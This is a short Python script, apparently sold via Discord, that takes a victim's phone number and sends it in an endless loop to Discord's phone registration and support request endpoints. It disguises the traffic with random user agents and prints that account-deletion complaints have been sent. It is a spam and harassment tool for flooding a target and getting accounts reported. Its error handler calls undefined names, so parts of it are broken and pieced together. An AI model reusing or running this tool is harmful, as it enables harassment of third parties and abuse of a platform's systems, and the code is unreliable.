import requests
import time
import os
import random
from fake_useragent import UserAgent
from datetime import datetime
import platform
import socket
import datetime
from termcolor import colored
import requests, fake_useragent

print("""
██████╗░██╗░░░██╗  ░█████╗░░█████╗░░██████╗████████╗██╗░░░██╗
██╔══██╗╚██╗░██╔╝  ██╔══██╗██╔══██╗██╔════╝╚══██╔══╝╚██╗░██╔╝
██████╦╝░╚████╔╝░  ██║░░╚═╝███████║╚█████╗░░░░██║░░░░╚████╔╝░
██╔══██╗░░╚██╔╝░░  ██║░░██╗██╔══██║░╚═══██╗░░░██║░░░░░╚██╔╝░░
██████╦╝░░░██║░░░  ╚█████╔╝██║░░██║██████╔╝░░░██║░░░░░░██║░░░
╚═════╝░░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░░░╚═╝░░░""")
time.sleep(5)
print("buy script - discord: casty1338")


user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
number = int(input('Введите номер телефона: '))
count = 0
nomer = number


try:
    while True:
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        response7 = requests.post('https://support.discord.com/hc/ru/requests',headers=headers, data={"phone": number})
        response8 = requests.post('https://support.discord.com/hc/ru/requests/new',headers=headers, data={"phone": number})
        response9 = requests.post('https://support.discord.com/hc/ru/requests',headers=headers, data={"phone": number})
        response10 = requests.post('https://dis.gd/contact',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Жалоба на удаления аккаунта отправлена!", {count})
except Exception as e:
    print('Что-то пошло не так')
    yukino += 1
    chosen_text = random.choice(text)
    chosen_contact = random.choice(contact)
    send_complaint(chosen_text, chosen_contact)
    time.sleep(0)
